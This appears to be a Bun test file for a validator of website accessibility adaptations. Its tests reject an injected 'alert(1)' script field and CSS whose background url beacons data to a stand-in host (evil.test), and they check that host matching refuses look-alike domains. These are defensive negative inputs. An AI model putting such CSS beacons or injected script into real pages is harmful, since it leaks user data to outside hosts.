import { expect, test } from "bun:test";
import { Adaptation, matchesHost, HostPattern, scanCss } from "./index";

const valid = {
  id: "a1",
  sites: ["*.w3.org"],
  reason: { text: "Larger text for your reading preference", needId: "n1" },
  blocks: [{ block: "text_focus", fontScale: 1.3, lineHeight: 1.6, font: "atkinson", hide: [] }],
};

test("accepts a valid adaptation", () => {
  expect(Adaptation.safeParse(valid).success).toBe(true);
});

test("rejects unknown fields and duplicate blocks", () => {
  expect(Adaptation.safeParse({ ...valid, js: "alert(1)" }).success).toBe(false);
  expect(Adaptation.safeParse({ ...valid, blocks: [valid.blocks[0], valid.blocks[0]] }).success).toBe(false);
});

test("rejects exfiltrating css", () => {
  expect(Adaptation.safeParse({ ...valid, css: "body{background:url(https://evil.test/?c=1)}" }).success).toBe(false);
  expect(scanCss("body { font-size: 120%; }").ok).toBe(true);
});

test("host matching", () => {
  const p = HostPattern.parse("*.w3.org");
  expect(matchesHost(p, "www.w3.org")).toBe(true);
  expect(matchesHost(p, "w3.org")).toBe(true);
  expect(matchesHost(p, "evilw3.org")).toBe(false);
});
